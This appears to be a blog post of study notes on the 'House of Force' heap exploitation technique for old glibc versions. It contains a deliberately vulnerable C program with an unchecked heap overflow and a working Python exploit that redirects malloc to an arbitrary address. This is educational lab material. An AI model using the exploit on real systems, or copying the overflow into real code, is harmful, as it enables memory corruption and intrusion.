---
layout: post
title: House of Force
description:
date: 2025-11-12
categories:
  - Notes
  - heap-exploitation
tags:
  - house-of-force
---
# House of Force

This is a older exploitation technique that works on `glibc` 2.27 and lower.

The goal of the house of force is to get `malloc()` to return a arbitrary value/address by overwriting the top chunk.
## So what is the top chunk?

The top chunk (also known as the wilderness) is a special chunk, it is last in memory (highest address) for the given heap arena. It is not part of any free bins and its primary purpose is to service memory allocates requests from `malloc()` when no other suitable free chunks are found in the available bins and it will be resized.

## Why does it not work on modern `glibc`?



## Requirements

- <= `glibc` 2.27
- Heap overflow from a chunk adjacent to the top chunk
- Control over the size of `malloc()`
- A heap address leak so we know the relative offset to our write location.
## Steps

1. Overwrite top chunk side field.
	- use a heap overflow to overwrite the size field of the top chunks.
	- Overwrite the size field with a big value so that we can ensure that `malloc()` will never call `mmap`:  `0xffffffffffffff` (64 bit)
2. Allocate a chunk that will get use right up against the desired location.
	- We must use a integer overflow. 
	- e.g. `top_chunk = 0x603110` | `target = 0x602080` 
		- use a integer overflow `0xffffffffffffef50` so that the top chunk is at `target` address.
		- `target - top_chunk - ox20`


##

Vulnerable sample program

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


char target[0x20] = "Nothing to see here";
char *heapchunk;

void init() {
	setbuf(stdin, NULL);
	setbuf(stderr, NULL);
	setbuf(stdout, NULL);
}

int main() {
	init();
	void *ptr = malloc(8);
	printf("Target @ %p\nHeap @ %p\n", &target, ptr - 0x10);

	int size;
	while (1) {
		printf("Size: ");
		scanf("%d", &size);
		heapchunk = (char*)malloc(size);
		printf("Data: ");
		scanf("%s", heapchunk);

		printf("Target : %s\n", target);
	}	
}
```

exploit

```python

def malloc(size:int, data:bytes):
	sla(b"Size: ", str(size).encode())
	sla(b"Data: ", data)

	ru(b"Target : ")
	data = rl().decode()

	log.info(f"Target : {data}")

def exploit():
	##################################################################### 
	######################## EXPLOIT CODE ###############################
	#####################################################################
	ru(b"Target @ ")
	target_addr = int(rl(), 16)
	ru(b"Heap @ ")
	heap = int(rl(), 16)
	print_leak("Target", target_addr)
	print_leak("Heap", heap)

	size = 256
	payload = flat(
		b"A"*size,
		size, # prev size
		0xffffffffffffffff # size
	)

	malloc(size, payload)
	size = target_addr - (heap + (0x18 + 256 + 0x10)) - 0x20 # `target - top_chunk - ox20`
	log.info("Distance: " + hex(size))
	malloc(size, b"AAA")
	size = 0x100
	malloc(size, b"PWNED|using_house_of_force")

	io.close()
```